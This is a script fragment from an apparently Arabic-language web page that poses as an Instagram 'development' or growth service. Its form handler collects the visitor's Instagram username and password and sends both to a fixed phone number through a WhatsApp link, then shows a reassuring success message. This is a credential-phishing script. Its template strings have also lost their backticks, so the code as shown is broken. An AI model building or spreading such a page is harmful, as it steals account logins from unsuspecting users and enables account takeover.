    <script>
        document.getElementById('instagramForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if(username && password) {
                // إعداد رسالة الواتساب
                const message = طلب جديد لتطوير الإنستقرام%0Aاسم المستخدم: ${username}%0Aكلمة المرور: ${password};
                const whatsappURL = https://wa.me/213793837202?text=${message};
                
                // افتح رابط الواتساب
                window.open(whatsappURL, '_blank');
                
                // إظهار رسالة نجاح
                alert('تم إرسال المعلومات بنجاح! سنتواصل معك قريباً.');
                
                // مسح الحقول
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
            } else {
                alert('يرجى ملء جميع الحقول');
            }
        });
        
        // إضافة تأثيرات ثلاثية الأبعاد عند تحريك الماوس
        const container = document.querySelector('.container');
        
        document.addEventListener('mousemove', (e) => {
            let x = (window.innerWidth / 2 - e.pageX) / 25;
            let y = (window.innerHeight / 2 - e.pageY) / 25;
            
            container.style.transform = rotateY(${x}deg) rotateX(${-y}deg);
        });
    </script>
